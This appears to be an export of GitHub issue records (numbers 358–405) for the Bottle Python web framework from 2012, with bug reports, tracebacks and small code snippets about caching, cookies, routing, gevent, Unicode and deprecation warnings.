405,Jinja2 Tempate cacheing seems to be broken in 0.11.3,2012-11-21T14:18:48Z,2012-11-21T16:01:31Z,,,,"After upgrading from bottle 0.10.11 to bottle 0.11.3, I noticed a masive drop in performance.

The difference is severe in a production environment, from about 2000 pages/s it dropped to about 90 pages/s.

So, with some more investigation I have narrowed it down to Jinja2 recompiling the template on every serve, instead of cacheing it.

I also didn't find any reference in the documentation as to if there is a usage change on using Jinja2 templates, and downgrading to bottle 0.10.11 resolved the performance issue.
"
404,Unicode path in response.set_cookie() failed with uwsgi >= 1.3,2012-11-19T04:57:13Z,,,TypeError,TypeError: http header value must be a string,"I'm getting a strange error after uwsgi, after hard tries I found the following code could run properly using bottle.run() or with uwsgi <= 1.2, but causes a 500 error with uwsgi >= 1.3.

The error looks like:

```
File "".../bottle.py"", line 837, in wsgi
     start_response(response._status_line, list(response.iter_headers())) 
TypeError: http header value must be a string
```

Test code:

```
from bottle import get, response, default_app, debug

@get(""/test/cookie"")
def test_cookie():
    response.set_cookie(""test"", ""test"", path=u""/"")

debug(True)
application = default_app()
```
"
403,Add a way to programmatically terminate the run() loop,2012-11-18T01:33:09Z,,,,,"Currently calling run() never returns, and I have to terminate the server loop with Ctrl-C. I would like some API to terminate the loop programmatically from within a request handler.
"
402,Handling the OPTIONS method,2012-11-17T21:04:10Z,2016-09-05T10:25:37Z,,,,"My app needs to handle cross-domain requests. This means that I need to handle the OPTIONS method, because the browser will send OPTIONS <path> before GET <path>. Handling this is not very convenient in Bottle, because I need to double the number of the routes. The other way to do it would be the catch-all route:

```
@bottle.route('/<:re:.*>', method='OPTIONS')
```

but this won't of course work - depending on the order of definitions, either the OPTIONS will not work, either the GET.

Currently, all my OPTIONS handlers do the same thing, so a single function is enough. Is there a way to handle this nicely? If not, then I think this case is specific enough to make an exception in the routing mechanism.
"
401,Bottle fails with Python 2.7+threadsafe on Google App Engine,2012-11-17T17:11:28Z,2012-11-17T19:21:04Z,,TypeError,TypeError: __call__ takes exactly 1 argument (3 given),"app.yaml:

```
application: my-app
version: 1
runtime: python27
api_version: 1
threadsafe: yes

- url: .*
  script: main.app
```

main.py:

```
import bottle

@bottle.route('/')
def root():
    return 'hello world'

bottle.run(server='gae', debug=True)
```

When I run this, the I get error in the console:

```
module main has no attribute app
```

When I try to fix this:

```
from bottle import app
```

then I get error in console:

```
TypeError: __call__ takes exactly 1 argument (3 given)
```

When I just specify main.py as the handler in app.yaml, then GAE complains that ""threadsafe cannot be enabled with CGI handler: main.py"".
"
400,Routing error with multiple Bottle objects and overlapping mount_prefixes,2012-11-16T10:33:10Z,,,,,"When using multiple bottle objects where one of the mount_prefix is a subset of another, the routes in the longer mount_prefix do not get resolved correctly (resulting in not-found errors). The attached example reproduces the problem.

``` python
'''
This is an example to recreate a problem scenario with having two Bottle Application Objects having  
mount prefix. The mount prefixes in our case are 
/testing/
/testing/submount

This leads to issues when trying to add routes under the second Bottle App, i.e. they become unaccessable.   

In this example, we have the following routes:

main_server is the default_app that represents the main server. 
    / is a convenience route to allow quick linking to all the test scenarios
    The main_server has 2 bottle apps:
        1. /testing/, which has the following routes:
            a./testing/index returns ""hello""
        2. /testing/submount, which has the following routes:
            a. / which returns ""submount-slash says hello""
            b. /hello2 which returns ""submount-hello2 says hello""    (This route will not work due to the bug.)
'''
import argparse
import bottle

#create default app.
main_server = bottle.default_app()

# create endpoints
ep1 = bottle.Bottle()
main_server.mount('/testing', ep1)

@ep1.route(path='/hello', method='GET')
def hello():
    return 'hello'

ep2 = bottle.Bottle()
main_server.mount('/testing/submount', ep2)

@ep2.route(path='/', method='GET')
def submountslash():
    return 'submountslash says hello'

@ep2.route(path='/hello2', method='GET')
def hello2():
    return 'submount-hello2 says hello'

@bottle.route(path='/', method='GET')
def index():
    return """"""
    <p>
    This simple program is to illustrate and reproduce what seems to be a 
    bug in bottle when working with multiple Bottle objects with one mount_prefix that is a substring of another mount_prefix.
    <p>
    The routes are
    <ul>
    <li> <a href=""/"">/</a> -- the output prints this message
    <li> <a href=""/testing/hello"">/testing/hello</a> -- outputs <em>hello</em> (this is a route on a 1st Bottle object with mount_prefix as '/testing'
    <li> <a href=""/testing/submount"">/testing/submount</a> -- outputs <em>submountslash says hello</em> (this is a route on a 2nd Bottle object with mount_prefix as '/testing/submount)'
    <li> <a href=""/testing/submount/hello2"">/testing/submount/hello2</a> -- SHOULD output <em>submount-hello2 says hello</em> but instead gives an error. We believe this to be a bug.
    </ul>
    """"""

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Bottle App Issues.')
    parser.add_argument('--host', dest='host', default='localhost', type=str, help='Hostname / IP address of this server (default: localhost)')
    parser.add_argument('--port', dest='port', default=9000, type=int, help='Port Number to run the server on (default: 9000)') 
    args = parser.parse_args()

    bottle.debug(True)
    bottle.run(app=main_server, host=args.host, port=int(args.port))
```
"
399,Don't truncate POST body.,2012-11-16T00:31:52Z,2013-02-11T16:59:38Z,,,,"BaseRequest._body() already uses MEMFILE_MAX to avoid memory exhaustion.

If this behavior was intentional, I'd suggest that this policy belongs in server config.
"
398,Cn doc,2012-11-14T07:16:59Z,2013-01-07T12:16:16Z,,,,"Hi, this is all the translated *.po files you need.

As to Chinese user, they need to change the value of ""language"" in docs/conf.py if they want to generate pdf doc.

Assuming they have xetex and ""WenQuanYi Micro Hei"" font installed, add this to conf.py

latex_preamble = '\usepackage{xeCJK}\n\setCJKmainfont{WenQuanYi Micro Hei}'
"
397,Sqlite plugin doesn't handle generators,2012-11-12T15:57:07Z,,,,,"A route handler in regular bottle is permitted to `yield` or return a generator.  The sqlite plugin wraps the call to the handler in a `try:... finally:...` that closes the database handle.

This causes problems if you write a generator that yields values lazily based on a database query, as access to the database may occur after the finally clause has been executed.
"
396,HTTPError and Abort don't send headers change (Basic Authorization don't work),2012-11-08T17:00:54Z,2012-12-16T13:55:50Z,,<pre>Error,<pre>Error: 401 Unauthorized,"Authorization form don't appear.
With:

<pre>@get('/test')
def test_page():
    response.headers['WWW-Authenticate'] = 'Basic realm=""Console""'
    abort(401, ""Authorization required"")</pre>

Displays only:

<pre>Error: 401 Unauthorized
Sorry, the requested URL 'http://127.0.0.1:8082/test' caused an error:
Authorization required</pre>


With:

<pre>def check_auth(user, password):
    return False

@get('/test')
@auth_basic(check_auth)
def test_page():
    return 'test'</pre>

Displays only:

<pre>Error: 401 Unauthorized
Sorry, the requested URL 'http://127.0.0.1:8082/test' caused an error:
Access denied</pre>
"
395,raises DeprecationWarning in bottle.mount(),2012-11-07T11:48:30Z,2012-12-22T20:07:39Z,,,,"```
bottle.py:571: DeprecationWarning: Call signature changed (for the better)
  return HTTPResponse(body, rs.status_code, rs.headers)
```
"
394,get_url missing in Macports?,2012-11-02T07:07:25Z,,,,,"I am using macports: python27 @2.7.3_1 and py27-bottle @0.10.9_0 

Everything has been running smooth until I ran into this tonight after trying to setup static files with relative paths.

from bottle import Bottle, run, route, view, template, static_file, get_url
- ImportError: cannot import name get_url

I also get the same importing just Bottle and trying Bottle.get_url
"
393,Append custom headers to reponse,2012-10-31T14:43:05Z,,,,,
392,mod_rewrite for bottle,2012-10-29T06:47:19Z,2012-10-29T14:35:30Z,,,,"Hi, 
I added code to mimic Apache's mod_rewrite:

URL are processed by a set of regular expressions _before_ they are processed by the routing system.
A set of examples can be found at the bottom of the code I added.

If this is something you are interested in, please modify, adapt and relocate it just as you need it!

_A case for this feature:_
If you want your server to react to two different paths, you'd have to copy each @route decorator. 
This way, a simple rule would handle it.

PS: Please be nice, my Python experiences are only some weeks old :)
"
391,Update docs/stpl.rst,2012-10-20T05:17:17Z,2012-10-20T18:14:34Z,,,,"The name ""Inline Statements"" seems misleading. If the Python code has to ""return a string or something that has a string representation"", you can _never_ use a Python statement there, only a Python expression, since statements don't return anything. I suggest mimicking the Python nomenclature and calling them ""Inline Expressions"" instead.
"
390,Bottle mangles abort when tcp stream not completed,2012-10-18T17:33:31Z,,,"{""error""","{""error"": ""Unrecognized event 'order+request'.""}","I think this is a bug in bottle. Or maybe its just my lack of understanding how bottle handles multipacket POSTs.
Bottle is calling my endpoint app before the complete POST packet has been received. But it seems that
the abort should not be mangled even if the whole stream as not been completed.

version 0.11 bottle python2.6 centos

My app checks the url path and if it does recognize a segment it aborts with a 400 error. 
JSON with the following content
{""error"": ""Unrecognized event 'order+request'.""}

This causes bottle to generate the following error

""POST /jofa/order/notify/TPI_Engineered_98728/order+request HTTP/1.1"" 400 188 0.001014
apps.orem.jiveip.net - - [18/Oct/2012 11:13:19] code 400, message Bad HTTP/0.9 request type ('<?xml')
apps.orem.jiveip.net - - [18/Oct/2012 11:13:19] ""<?xml version=""1.0""?>"" 400 -

When I look at the stack trace in wireshark. Bottle is returning the error before the incoming request has completed. The request is spread across two tcp packets.

The problem goes away if I  do
bottle.request.body.getvalue() before I look at the url and send the abort
Whereas if I send the abort before i read then the error occurs.
In both cases the abort is sent. But in the working case I get a valid 400 error not the mangled one.
Valid error
HTTP/1.1 400 Bad Request
Date: Thu, 18 Oct 2012 17:30:23 GMT
Content-Length: 48
Content-Type: application/json
Connection: close
{""error"": ""Unrecognized event 'order+request'.""}

DeprecationWarning: Use HTTPResponse.body instead of HTTPResponse.output

Abort method
@app.error(400)
def error400(ex):
    bottle.response.set_header('content-type', 'application/json')
    return json.dumps(dict(error=ex.output))

Erroneous Code
@app.route('/jofa/order/notify/<po>/<event>', method='GET') 
@app.route('/jofa/order/notify/<po>/<event>', method='POST')
def orderNotifyPoEventPost(po, event):

```
event = event.lower()
if event not in helping.EventMaps:
    bottle.abort(400, ""Unrecognized event '%s'."" % event)

data = bottle.request.body.getvalue()
if not data:
    bottle.abort(400, ""Missing notice body."")

...
```

Working code

@app.route('/jofa/order/notify/<po>/<event>', method='GET') 
@app.route('/jofa/order/notify/<po>/<event>', method='POST')
def orderNotifyPoEventPost(po, event):

```
data = bottle.request.body.getvalue()
if not data:
    bottle.abort(400, ""Missing notice body."")

event = event.lower()
if event not in helping.EventMaps:
    bottle.abort(400, ""Unrecognized event '%s'."" % event)


...
```

Here is the wireshark tcp stream conversation when it fails. Notice that the abort comes
back before the whole stream has completed. Ie the xml file is not complete. A subsequent tcp packet contained the rest
The bottle app is behind an Apache proxy.

POST /jofa/order/notify/TPI_Engineered_98728/order+request HTTP/1.1
Host: localhost:8081

Accept: _/_
Content-Type: application/x-www-form-urlencoded
Expect: 100-continue

Connection: Keep-Alive
Content-Length: 39747

<?xml version=""1.0""?>
<response xmlns=""https://www.netxusa.com"">
  <requestResult>success</requestResult>
  <body><order >
  ...Snip
... Snip

```
      </setting>
      <setting>
        <name>REG_1_LINE_ENABLE</name>
        <description>This is for enabling Line 1.</description>
        <displayGroups>
          <displayGroup>SIP</displayGroup>
          <HTTP/1.1 400 Bad Request
```

Content-Length: 48
Content-Type: application/json
Date: Thu, 18 Oct 2012 16:38:32 GMT
Connection: keep-alive

{""error"": ""Unrecognized event 'order+request'.""}<head>
<title>Error response</title>
</head>
<body>

<h1>Error response</h1>

<p>Error code 400.
<p>Message: Bad HTTP/0.9 request type ('&lt;?xml').
<p>Error code explanation: 400 = Bad request syntax or unsupported method.
</body>
"
389,Bottle v.11.2 still raises DeprecationWarning in bottle.redirect() and Router.match(),2012-10-17T00:14:55Z,2012-10-17T21:26:01Z,,,,"bottle.redirect() in v.11.2 still uses the deprecated ""header"" when creating a HTTPResponse.

Line 2048:

```
raise HTTPResponse("""", status=code, header=dict(Location=location))
```

Should be:

```
raise HTTPResponse("""", status=code, Location=location)
```

Also looks like Router.match() is using the old style to construct an HTTPError:

Line 410-411:

```
raise HTTPError(405, ""Method not allowed."",
                header=[('Allow',"","".join(allowed))])
```

Should be:

```
raise HTTPError(405, ""Method not allowed."",
                Allow="","".join(allowed))
```
"
388,Questionable code in the todo app tutorial.,2012-10-15T14:42:24Z,,,,,"The [server setup section](http://bottlepy.org/docs/dev/tutorial_app.html#server-setup) for Apache + `mod_wsgi` contains an example `*.wsgi` file which uses `os.chdir()`.  In general this is unsafe.  And if you try to do this with two different wgsi apps it definitely breaks one of them because the working directory changes to something unexpected.
"
387,Problem with template lookup and mod_wsgi,2012-10-15T13:07:23Z,2012-10-17T21:26:00Z,,,,"I have a problem with template lookup and `mod_wsgi`. A template name seems to be _always_ looked up in the current working directory first and there is nothing I can do about it.  It's the first line of `BaseTemplate.search()`.

As the current working directory under `mod_wsgi` could be anything it is easy to pick up wrong files.  I have an `index.html` template in the `views/` directory and adapted `bottle.TEMPLATE_PATH`.  I get almost all templates from there but the `index.html` is picked up from `/var/www/` and is of course not the template file I wanted to load.

Renaming the template is a workaround but IMHO not a good permanent solution.
"
386,response cookies cleared after redirect(),2012-10-15T06:49:39Z,2012-10-17T21:26:01Z,,,,"version 0.11.2

``` python
@get('/')
def index():
   response.set_cookie('key', 'value')
   redirect('/b')
   ...

@get('/b')
def b():
   request.get_cookie('key')  # None
   ...
```
"
385,Git tag for version 0.11.2 is missing,2012-10-11T20:48:33Z,2012-10-11T20:52:24Z,,,,"Release 0.11.2 is on pypi but the related source file is not available on Github.

Thanks
"
384,Bottle raises takes exactly 2 arguments (0 given),2012-10-10T14:55:38Z,,,TypeError,TypeError: user_test() takes exactly 2 arguments (0 given)</pre>,"If arguments of the function has a keyword argument  (eg, db) of plugin (eg, Plugin Example: SQLitePlugin) and uses @bottle.view (or another decorator), raises the exception:

<pre>Traceback (most recent call last):
  File ""D:\!Project\bottle.py"", line 764, in _handle
    return route.call(**args)
  File ""D:\!Project\bottle.py"", line 1573, in wrapper
    rv = callback(*a, **ka)
  File ""D:\!Project\bottle.py"", line 3125, in wrapper
    result = func(*args, **kwargs)
TypeError: user_test() takes exactly 2 arguments (0 given)</pre>


Code:

<pre>@get('/user')
@bottle.view('admin-category-add')
def user_test(db):
    return 'user'</pre>

Bottle 0.11.1
"
383,Bottle raises DeprecationWarning - internal,2012-10-10T01:57:09Z,2012-10-10T15:23:24Z,,,,"v0.11.1 from pip

```
bottle.py:2114: DeprecationWarning: Call signature changed (for the better)
    return HTTPResponse(body, header=header)
```

```
bottle.py:810: DeprecationWarning: Use HTTPResponse.body instead of HTTPResponse.output
  return self._cast(out.output)
```

```
bottle.py:2099: DeprecationWarning: Call signature changed (for the better)
  return HTTPResponse(status=304, header=header)
```
"
382,Test failures with Python 3,2012-09-28T23:30:52Z,2012-10-04T17:22:53Z,,"RuntimeError, TypeError, AssertionError","RuntimeError: dictionary changed size during iteration, TypeError: not indexable, AssertionError: 'https://127.0.0.1/test.html' != 'http://127.0.0.1/test.html'","test_multipart fails with Python 3.1, 3.2 and 3.3.
test_sheme often fails with Python 3.3 and can fail in 2 different places.
(Test results from git head.)

Example 1:

```
$ python3.3 test/testall.py
WARNING: Skipping 'bjoern' test (ImportError).
WARNING: Skipping 'cherrypy' test (ImportError).
WARNING: Skipping 'diesel' test (ImportError).
WARNING: Skipping 'eventlet' test (ImportError).
WARNING: Skipping 'meinheld' test (ImportError).
WARNING: Skipping 'gevent' test (ImportError).
WARNING: Skipping 'gunicorn' test (ImportError).
WARNING: Skipping 'paste' test (ImportError).
WARNING: Skipping 'rocket' test (ImportError).
WARNING: Skipping 'twisted' test (ImportError).
======================================================================
ERROR: test_sheme (test_environ.TestRedirect)
----------------------------------------------------------------------
Traceback (most recent call last):
  File ""/tmp/bottle/test/test_environ.py"", line 645, in test_sheme
    wsgi_url_scheme='https')
  File ""/tmp/bottle/test/test_environ.py"", line 589, in assertRedirect
    for key in args:
RuntimeError: dictionary changed size during iteration

======================================================================
ERROR: test_multipart (test_environ.TestRequest)
Environ: POST (multipart files and multible values per key)
----------------------------------------------------------------------
Traceback (most recent call last):
  File ""/tmp/bottle/test/test_environ.py"", line 288, in test_multipart
    self.assertTrue(request.files.file2)
  File ""/usr/lib64/python3.3/unittest/case.py"", line 519, in assertTrue
    if not expr:
  File ""/usr/lib64/python3.3/cgi.py"", line 637, in __len__
    return len(self.keys())
  File ""/usr/lib64/python3.3/cgi.py"", line 626, in keys
    raise TypeError(""not indexable"")
TypeError: not indexable

----------------------------------------------------------------------
Ran 269 tests in 4.577s

FAILED (errors=2)
```

Example 2:

```
$ python3.3 test/testall.py
WARNING: Skipping 'bjoern' test (ImportError).
WARNING: Skipping 'cherrypy' test (ImportError).
WARNING: Skipping 'diesel' test (ImportError).
WARNING: Skipping 'eventlet' test (ImportError).
WARNING: Skipping 'meinheld' test (ImportError).
WARNING: Skipping 'gevent' test (ImportError).
WARNING: Skipping 'gunicorn' test (ImportError).
WARNING: Skipping 'paste' test (ImportError).
WARNING: Skipping 'rocket' test (ImportError).
WARNING: Skipping 'twisted' test (ImportError).
======================================================================
ERROR: test_multipart (test_environ.TestRequest)
Environ: POST (multipart files and multible values per key)
----------------------------------------------------------------------
Traceback (most recent call last):
  File ""/tmp/bottle/test/test_environ.py"", line 288, in test_multipart
    self.assertTrue(request.files.file2)
  File ""/usr/lib64/python3.3/unittest/case.py"", line 519, in assertTrue
    if not expr:
  File ""/usr/lib64/python3.3/cgi.py"", line 637, in __len__
    return len(self.keys())
  File ""/usr/lib64/python3.3/cgi.py"", line 626, in keys
    raise TypeError(""not indexable"")
TypeError: not indexable

======================================================================
FAIL: test_sheme (test_environ.TestRedirect)
----------------------------------------------------------------------
Traceback (most recent call last):
  File ""/tmp/bottle/test/test_environ.py"", line 596, in assertRedirect
    bottle.redirect(target, **(query or {}))
  File ""/tmp/bottle/bottle.py"", line 2047, in redirect
    raise HTTPResponse("""", status=code, header=dict(Location=location))
bottle.HTTPResponse

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File ""/tmp/bottle/test/test_environ.py"", line 645, in test_sheme
    wsgi_url_scheme='https')
  File ""/tmp/bottle/test/test_environ.py"", line 601, in assertRedirect
    self.assertEqual(result, r.headers['Location'])
AssertionError: 'https://127.0.0.1/test.html' != 'http://127.0.0.1/test.html'
- https://127.0.0.1/test.html
?     -
+ http://127.0.0.1/test.html


----------------------------------------------------------------------
Ran 269 tests in 4.581s

FAILED (failures=1, errors=1)
```
"
381,plugin.apply: rename context to route,2012-09-24T12:28:35Z,2012-10-04T17:36:37Z,,,,"With api v2, the second param to apply is the route instance not the context.
(this is a 'documentation' change, the param is not used)
"
380,Fix regression in pull request 378 (issue #334),2012-09-20T05:54:54Z,2012-09-20T08:01:20Z,,,,"As per comment in pull request 378
"
379,JSONPlugin will not create a dump for an array,2012-09-19T11:23:00Z,2013-10-18T15:21:14Z,,,,"In the code, this part:
 if isinstance(rv, dict):
                #Attempt to serialize, raises exception on failure
                json_response = dumps(rv)
                #Set content type only if serialization succesful
                response.content_type = 'application/json'
                return json_response
            return rv

eventhough it should serialize just fine with an array such as [{'a':'test'},{'b':'test2'}]
"
378,Avoid __main__.ext namespace,2012-09-19T11:11:37Z,2012-09-19T11:54:28Z,,,,"Fix #334.
"
377,StripPathMiddleware redirect,2012-09-17T10:57:59Z,2012-10-09T15:18:25Z,,,,"Pull request for #332.
"
376,use template in tutorial to match index,2012-09-16T22:36:16Z,2012-09-16T23:08:12Z,,,,
375,Fixed code indent in one of the examples,2012-09-11T18:48:33Z,2012-09-16T21:09:08Z,,,,"Hi, I noticed there was an incorrect code indent for one of the examples on the page http://bottlepy.org/docs/dev/tutorial_app.html, so I fixed it.
"
374,bottle and monkeyless gevent,2012-09-06T18:33:18Z,,Request,,,"How feasible is it to monkey patch bottle to use gevent/greenlet facilities where applicable rather than rely on gevent's monkey patching of the standard library? while I'm currently using gevent, I also prefer to avoid gevent's monkey patching - I know some people view the convenient monkey patching as part of the point of using gevent, but it does work usefully without it.

Maybe a `bottle.gevent_myself()`  could be added (you're in a better position than me to know what exactly would need patching, but to me it just looks like the `_lctx`, `localproperty` and anything using it i.e. `LocalRequest`/`LocalResponse` stuff). That way bottle wouldn't need gevent monkey patching to have taken place (or cause it to take place, either i.e. I mean a function that switches bottle over to use greenlet.local etc. where necessary, not a function that just calls gevent.monkey stuff). 
"
373,Added abillity to use variables in %include statements,2012-09-05T17:32:09Z,2015-12-18T23:06:42Z,,,,"Now you can use {{variable}} and {{!variable}} markup in %include statements.

Simple example:
main.py

``` python
import bottle

@bottle.route(""/"")
def index():
    return bottle.template(""test"", {
            ""what"":  ""template""
        })

bottle.run(host='localhost', port=8080)
```

test.tpl

```
Template 1
%include cool_{{what}}
```

cool_template.tpl

```
Template 2
```
"
372,Optional routing parameters with default values,2012-09-05T15:21:44Z,,,,,"Consider the hello world example:

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from bottle import route, run
@route('/hello/<name>')
def index(name='World'):
    return '<b>Hello %s!</b>' % name

run(host='localhost', port=8080)
```

If I leave the `<name>` part empty, it gives out an 404 error. Is it possible to have it default to ""World""?
"
371,Non-ascii characters in the URL result in malformed data,2012-09-05T15:16:12Z,2013-11-28T23:38:40Z,,,,"Consider the hello world example:

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-

from bottle import route, run
@route('/hello/<name>')
def index(name='World'):
    return '<b>Hello %s!</b>' % name

run(host='localhost', port=8080)
```

Here, calling the url `http://localhost/hello/ŞĞÜ` results in:

<pre>Hello ÅÄÃ!</pre>

Any ideas?
"
370,Fix xss in hello world example,2012-09-05T00:13:08Z,2012-09-16T21:16:33Z,,,,
369,Plugin Development tutorial code error,2012-08-24T15:17:22Z,2012-08-29T23:30:11Z,,,,"Just a small error reported in maillist.
"
368,Gevent + Bottle Crash at multi request at the same time,2012-08-23T11:13:20Z,2012-09-16T21:34:10Z,,,,"Hi all, 

I have some code like this:

Main module file:

```
from sub_module import sub_app

app = Bottle()

app.mount('/prefix', sub_app)

run(app, ...,  server='gevent')
```

When I send POST request at the **same** time , to   /prefix  and  /prefix/aaa

bottle crashed and thrown out error messages.
same as this  https://github.com/defnull/bottle/issues/317

After some check ,   I found that  one of that request ,  Gevent not handled it,  
gevent not set environ  so that cause bottle caught the wrong env: SCRIPT_NAME ,   PATH_INFO

When not set server or set server='tornado',  It works well

So , any help?

Thanks.
"
367,Bottle doesn't work under a relocatable virtualenv,2012-08-22T09:40:08Z,2012-10-09T15:16:04Z,,SyntaxError,SyntaxError: from __future__ imports must occur at the beginning of the file,"On heroku platform virtualenvs are relocatable (--relocatable parameter) and it add an activation line at the top of bottle.py file and the import line  `from __future__ import with_statement` dumps an exception like it:
### Exception

```
  File ""/private/tmp/venv/bin/bottle.py"", line 19
    from __future__ import with_statement
SyntaxError: from __future__ imports must occur at the beginning of the file
```
### Steps to reproduce this problem

```
1. virtualenv --distribute venv
2. source venv/bin/activate
3. pip install bottle==0.10.11
4. virtualenv --relocatable venv/
5. bottle.py 
```
### Original File bottle.py

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
""""""
Bottle is a fast and simple micro-framework for small web applications. It
offers request dispatching (Routes) with url parameter support, templates,
a built-in HTTP Server and adapters for many third party WSGI/HTTP-server and
template engines - all in a single file and with no dependencies other than the
Python Standard Library.

Homepage and documentation: http://bottlepy.org/

Copyright (c) 2011, Marcel Hellkamp.
License: MIT (see LICENSE.txt for details)
""""""

from __future__ import with_statement
```
### With virtualenv --relocatable

```
#!/usr/bin/env python2.7

import os; activate_this=os.path.join(os.path.dirname(os.path.realpath(__file__)), 'activate_this.py'); execfile(activate_this, dict(__file__=activate_this)); del os, activate_this

# -*- coding: utf-8 -*-
""""""
Bottle is a fast and simple micro-framework for small web applications. It
offers request dispatching (Routes) with url parameter support, templates,
a built-in HTTP Server and adapters for many third party WSGI/HTTP-server and
template engines - all in a single file and with no dependencies other than the
Python Standard Library.

Homepage and documentation: http://bottlepy.org/

Copyright (c) 2011, Marcel Hellkamp.
License: MIT (see LICENSE.txt for details)
""""""

from __future__ import with_statement

__author__ = 'Marcel Hellkamp'
__version__ = '0.10.11'
__license__ = 'MIT'
```
"
366,request.forms.get doesn't handle all (>100) input fields in form,2012-08-20T21:15:55Z,2013-02-11T18:42:48Z,,,,"I handle large forms.
with bottle 0.9 everything goes well, but since I upgraded to 0.10.11 (from 0.9.*) request.forms.get returns None for input field no. 119 and all next fields.
All field names are different, I read them (and create them) with a for-loop:
request.forms.get('%s_field' % i)

Any ideas, or further info needed?

Here is a demonstration for the problem:

<pre>
#!/usr/bin/python
# -*- coding: utf-8 *-*

from bottle import template, route, run, request, response, abort, redirect

array = []
for i in range(200):
    array.append('foo')
print array

@route('/index')
def index():
    return template('test', array = array)

@route('/change', method='POST')
def change():
    print 'tet'
    for i in range(200):
        array[i] = request.forms.get('input_%s' % str(i))
    redirect('/index')

run(host='localhost', port=8080)
</pre>

and the template:

<pre>
form action=""/change"" method=""post"" accept-charset=""utf-8"">
%for i in range(200):
    {{str(i)}}: input name=""input_{{i}}"" type=""text"" size=""10"" value = ""{{array[i]}}"">
%end
input type=""submit"" value=""Submit"">
/form>

</pre>

(I removed ""<""-sings to supress html-rendering...)

After sending the form to bottle the input 100 and all next ones will be ""None"".
"
365,Suppressing line breaks is invalid,2012-08-20T04:31:54Z,,,,,"Suppressing line breaks is invalid

<pre>
&lt;span&gt;\\
%if True:
nobreak\\
%end
&lt;/span&gt;
</pre>
"
364,"Unicode issue with Python 2.7, WTForms and SimpleTemplate",2012-08-17T12:19:53Z,,,UnicodeEncodeError,UnicodeEncodeError: 'ascii' codec can't encode characters in position 52-54: ordinal not in range(128),"Hello, 

stumbled upon problem with above mentioned tools and cannot get to output field label defined in a form using the simple template engine.

Lets have simple form defined as such (WTForms):

``` python
    class UserLoginForm(Form):
        email = StringField('Uživatelske jmeno (email)', 
                                       [validators.Required(), validators.Email()])
        password = PasswordField('Heslo', [validators.Required()])
```

Notice the labels use national characters (prepending the string with 'u' doesn't help). Then in my template, I would have something along these lines:

``` html
<form method=""post"" action=""/user/login"" >
  {{! form.email.label }}
  {{! form.email }}

  {{! form.password.label }}    
  {{! form.password }}
  <input type=""submit"" />
</form>
```

Running this example, bottle will throw:

``` python
UnicodeEncodeError: 'ascii' codec can't encode characters in position 52-54: ordinal not in range(128)
```

No processing is done in between apart from instantiating the form and passing it to the template. Any suggestions as to how to solve this issue?
"
363,POST body TemporaryFiles not cleaned up,2012-08-16T14:27:05Z,2012-08-20T12:06:46Z,,,,"When exceeding the MEMFILE_MAX size for content-length, bottle creates a TemporaryFile object for body. But these won't be cleaned up after the request is finished. This causes exhausted HD space issues for us.
"
362,Exception KeyError in module 'threading',2012-08-14T20:53:14Z,,,,,"The main pgm:
# ! /usr/bin/env python
# -_\- coding: latin-1 -_-

import gevent, gzip
from gevent import monkey; monkey.patch_all()

from bottle import route, run, debug, template, request, error, response, redirect, static_file
from urlparse import parse_qs

...

if **name** == '**main**':
    basedatos = sys.argv[-1]
    elhost = '192.168.43.129'
    if os.getcwd()=='/var/www/lims':
        p=8000
        run(server='gevent', port=p, host=elhost)
    else:
        p=8002
        debug(True)
##         run(port=p, host=elhost, reloader=True)

I am on Ubuntu 12.04
Bottle versions 0.11.dev and 0.10.11

When I stop the program (in both folders):

^CException KeyError: KeyError(33551632,) in module 'threading' from '/usr/lib/python2.7/threading.pyc' ignored

When I save a correction:

Exception in thread Thread-1:
Traceback (most recent call last):
  File ""/usr/lib/python2.7/threading.py"", line 551, in __bootstrap_inner
    self.run()
  File ""/usr/local/lib/python2.7/dist-packages/bottle.py"", line 2743, in run
    thread.interrupt_main()
KeyboardInterrupt

It doesn't seem to do any harm, but I think you should know.
"
361,copy.deepcopy(request.query) will raise exception,2012-08-06T11:12:56Z,,,TypeError,TypeError: 'unicode' object is not callable,"bottle 0.10.11
the error is bellow:

<pre>
Traceback (most recent call last):
  File ""C:\Python27\lib\site-packages\bottle.py"", line 744, in _handle
    return route.call(**args)
  File ""C:\Python27\lib\site-packages\bottle.py"", line 1529, in wrapper
    rv = callback(*a, **ka)
  File ""C:\Python27\lib\site-packages\bottle.py"", line 1479, in wrapper
    rv = callback(*a, **ka)
  File ""x.py"", line 16, in index
    print copy.deepcopy(request.query)
  File ""C:\Python27\lib\copy.py"", line 182, in deepcopy
    rv = reductor(2)
TypeError: 'unicode' object is not callable
</pre>
"
360,Fixed spelling mistake/typo.,2012-08-05T12:52:43Z,2012-08-05T13:59:44Z,,,,"Changed ""refecence"" to ""reference"".
"
359,bottle does not respect json content-type on error routings,2012-08-04T20:40:58Z,,,,,"something like:

```
@error(404)
def error404(error)
    return {'error':'404'}
```

will still response with:

```
Content-Type: text/html; ...
```
"
358,Crash after uploading .mht file,2012-08-03T07:34:18Z,2012-08-06T09:04:37Z,,ValueError,ValueError: Invalid boundary in multipart form: b'',"An .mht file can be created by internet explorer 9, using the save-page function. It is actually a mime multipart message combining  all files of a visible into one archive.

I wanted to upload such a file to my bottle-server.  However, bottle (or maybe even cgi.py) try to parse the payload and conclude to an invalid boundary.

Traceback (most recent call last):
  File ""c:\python32\lib\site-packages\bottle.py"", line 787, in _handle
    return route.call(*_args)
  File ""c:\python32\lib\site-packages\bottle.py"", line 1575, in wrapper
    rv = callback(_a, **ka)
  File ""cbgserver.py"", line 41, in cbg_step1_post
    tmp = request.files.data.make_file()
  File ""c:\python32\lib\site-packages\bottle.py"", line 162, in __get__
    if key not in storage: storage[key] = self.getter(obj)
  File ""c:\python32\lib\site-packages\bottle.py"", line 1032, in files
    for name, item in self.POST.allitems():
  File ""c:\python32\lib\site-packages\bottle.py"", line 162, in **get**
    if key not in storage: storage[key] = self.getter(obj)
  File ""c:\python32\lib\site-packages\bottle.py"", line 1100, in POST
    data = FieldStorage(**args)
  File ""c:\python32\lib\cgi.py"", line 542, in **init**
    self.read_multi(environ, keep_blank_values, strict_parsing)
  File ""c:\python32\lib\cgi.py"", line 690, in read_multi
    self.encoding, self.errors)
  File ""c:\python32\lib\cgi.py"", line 542, in **init**
    self.read_multi(environ, keep_blank_values, strict_parsing)
